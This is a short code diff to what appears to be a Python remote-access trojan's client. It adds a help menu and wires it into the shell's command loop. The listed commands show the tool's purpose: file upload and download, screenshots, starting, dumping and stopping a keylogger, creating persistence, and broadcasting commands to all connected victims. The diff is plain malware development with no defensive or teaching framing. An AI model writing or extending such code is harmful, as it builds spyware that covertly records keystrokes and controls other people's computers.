@@ -66,6 +66,28 @@ def connection():
         except:
             connection()
 
+def help():
+    commands = {
+        'quit': 'Quit the shell',
+        'background': 'Run the shell in the background',
+        'help': 'Show this help information',
+        'clear': 'Clear the terminal screen',
+        'cd': 'Change directory',
+        'upload': 'Upload a file',
+        'download': 'Download a file',
+        'screenshot': 'Take a screenshot',
+        'keylog_start': 'Start keylogger',
+        'keylog_dump': 'Dump keylogger logs',
+        'keylog_stop': 'Stop keylogger',
+        'persistence': 'Create persistence',
+        'sendall': 'Send a command to all connected clients',
+    }
+
+    result = ''
+    for command, description in commands.items():
+        result += f'{command}: {description}\n'
+    reliable_send(result)
+
 def shell():
     while True:
         command = reliable_recv()
@@ -74,7 +96,7 @@ def shell():
         elif command == 'background':
             pass
         elif command == 'help':
-            pass
+            help()
         elif command == 'clear':
             pass
         elif command[:3] == 'cd ':
